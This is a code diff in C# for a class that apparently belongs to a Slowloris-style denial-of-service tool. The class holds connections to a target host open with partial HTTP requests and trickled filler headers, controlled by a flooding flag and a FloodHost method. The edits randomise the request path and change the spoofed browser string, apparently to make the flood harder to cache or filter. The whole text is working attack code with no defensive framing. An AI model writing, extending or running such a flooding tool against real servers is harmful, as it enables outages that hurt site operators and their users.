@@ -2,6 +2,7 @@
 using System.Net.Sockets;
 using System.Text;
 
+// this needs ssl though
 internal class LimitedHttpConnection
 {
     private readonly TargetInfo _target;
@@ -9,7 +10,7 @@ internal class LimitedHttpConnection
     private Socket? socket;
     private ThrottledNetworkStream? stream;
 
-    private bool _isFlooding = true;
+    volatile private bool _isFlooding = true;
 
     public LimitedHttpConnection(TargetInfo target)
     {
@@ -66,14 +67,14 @@ internal class LimitedHttpConnection
 
     private async Task SendHeadersAsync()
     {
-        const string FORMAT = "GET / HTTP/1.1\r\nHost: {0}\r\nAccept: */*\r\nMozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n";
-        await WriteAsync(FORMAT, _target.host);
+        const string FORMAT = "GET /{1} HTTP/1.1\r\nHost: {0}\r\nAccept: */*\r\nMozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n";
+        await WriteAsync(FORMAT, _target.host, new Random().Next(0, int.MaxValue));
     }
 
     private async Task KeepAliveAsync()
     {
-        const string FORMAT = "KeepAlive: {0}\r\n";
-        await WriteAsync(FORMAT, new Random().Next(0, 1000));
+        const string FORMAT = "X-a: b\r\n";
+        await WriteAsync(FORMAT);
     }
 
     public async Task FloodHost()
